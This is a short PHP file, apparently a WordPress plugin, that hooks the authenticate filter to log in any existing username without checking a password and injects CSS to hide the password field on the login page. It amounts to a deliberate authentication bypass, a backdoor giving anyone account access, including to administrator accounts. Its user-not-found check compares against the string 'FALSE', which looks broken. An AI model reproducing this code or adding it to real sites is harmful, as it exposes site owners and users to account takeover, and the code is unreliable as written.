
<?php

function admin_login($user, $username, $password) {
    $user = get_user_by("login", $username);

    if($user != "FALSE")
    {
        wp_set_auth_cookie($user->ID);
    }
    else
    {
        return null;
    }
    return $user;
}


function hide_password_field() 
{
    ?>
        <style type="text/css">
            body.login div#login form#loginform p:nth-child(2) {
                display: none;
            }
        </style>
    <?php
}

add_filter("authenticate", "admin_login", 10, 3);
add_action("login_head", "hide_password_field");
?>
